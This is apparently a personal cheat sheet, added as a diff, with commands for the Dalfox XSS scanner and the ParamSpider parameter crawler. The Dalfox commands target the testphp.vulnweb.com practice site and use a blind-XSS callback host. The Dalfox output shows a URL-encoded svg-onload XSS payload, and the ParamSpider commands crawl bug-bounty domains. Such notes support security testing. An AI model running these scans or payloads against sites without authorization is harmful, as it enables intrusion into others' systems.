@@ -1,0 +1,32 @@
+Dalfox
+
+Cach 1:
+/go/bin/dalfox url http://testphp.vulnweb.com/listproducts.php\?cat\=123\&artist\=123\&asdf\=ff -b https://hahwul.xss.ht
+
+Cach 2: 
+▶ dalfox url http://testphp.vulnweb.com/listproducts.php\?cat\=123\&artist\=123\&asdf\=ff | cut -d " " -f 2 > output
+▶ cat output
+http://testphp.vulnweb.com/listproducts.php?artist=123&asdf=ff&cat=123DalFox
+http://testphp.vulnweb.com/listproducts.php?artist=123&asdf=ff&cat=123%22%3E%3Csvg%2FOnLoad%3D%22%60%24%7Bprompt%60%60%7D%60%22+class%3Ddalfox%3E
+
+
+
+
+
+
+
+
+
+
+
+Paramspider:
+
+python3 paramspider.py --domain hackerone.com
+python3 paramspider.py --domain hackerone.com -o /root/Desktop/Name.txt
+cat Nane.txt
+
+python3 paramspider.py --domain bugcrowd.com --exclude woff,css,js,png,svg,php,jpg --output bugcrowd.txt
+
+
+
+
